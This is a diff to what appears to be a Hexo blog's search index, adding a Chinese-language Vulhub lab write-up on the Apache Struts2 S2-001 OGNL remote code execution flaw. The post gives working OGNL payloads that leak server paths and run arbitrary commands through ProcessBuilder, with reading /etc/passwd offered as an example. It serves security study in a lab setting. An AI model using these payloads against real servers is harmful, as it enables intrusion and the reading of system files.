@@ -18,4 +18,38 @@
         <tag>hexo</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Vulhub解题，每日一题</title>
+    <url>/2021/11/26/Vulhub/</url>
+    <content><![CDATA[<h1 id="1-S2-001-远程代码执行漏洞"><a href="#1-S2-001-远程代码执行漏洞" class="headerlink" title="1.S2-001 远程代码执行漏洞"></a>1.S2-001 远程代码执行漏洞</h1><blockquote>
+<p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>执行如下命令来启动S2-001测试环境</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/26/Vulhub/s2-001-1.jpg"></p>
+<h2 id="POC-amp-amp-EXP"><a href="#POC-amp-amp-EXP" class="headerlink" title="POC &amp;&amp; EXP"></a>POC &amp;&amp; EXP</h2><p>基本测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;1+1&#125;</span><br></pre></td></tr></table></figure>
+<p>显示为2</p>
+<p><img src="/2021/11/26/Vulhub/s2-001-2.jpg"><br><img src="/2021/11/26/Vulhub/s2-001-3.jpg"></p>
+<p>成功执行</p>
+<p>获取tomcat执行路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取Web路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行任意命令（命令加参数：<code>new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Vulhub</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
 </search>
